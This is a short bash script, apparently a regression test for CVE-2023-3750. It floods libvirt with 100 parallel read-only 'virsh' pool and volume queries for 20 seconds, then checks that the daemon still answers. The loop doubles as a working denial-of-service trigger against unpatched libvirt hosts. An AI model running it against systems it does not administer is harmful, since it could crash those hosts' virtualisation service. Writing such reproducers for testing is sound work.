#!/bin/bash

#
#This file is a parallel test script for testing CVE-2023-3750
#
POOL=$1
VOL=$2
function test_run() {
 while true;do
   parallel -N0 "virsh -r 'pool-list; vol-info --pool $1 $2'" ::: {1..100}
 done
}

export -f test_run

timeout 20 bash -c "test_run $POOL $VOL"
virsh vol-info --pool $POOL $VOL
exit $?
